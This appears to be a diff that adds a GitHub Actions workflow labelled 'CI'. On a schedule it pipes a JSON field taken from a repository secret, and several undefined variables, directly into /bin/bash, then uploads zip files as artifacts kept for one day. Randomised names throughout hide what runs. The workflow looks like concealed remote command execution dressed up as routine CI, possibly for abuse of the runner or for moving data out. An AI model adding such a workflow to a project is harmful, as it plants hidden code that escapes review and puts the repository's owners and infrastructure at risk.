@@ -1,0 +1,32 @@
+name: CI
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '25 2,8,14,20 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Perform
+        env:
+          tpq9: ${{ secrets.tpq9 }}
+        run: |
+          printf '%s' "$tpq9" | jq -r .kyxp5628 | /bin/bash
+          printf '%s' "$naot071" | jq -r .oywm439 | /bin/bash
+          printf '%s' "$xh4" | jq -r .uvx31645 | /bin/bash
+          echo $elait470 | jq -r .u89 | /bin/bash
+          printf '%s' "$pvr631" | jq -r .afha436 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: 2QlWg3AV
+          path: "*.zip"
+          retention-days: 1
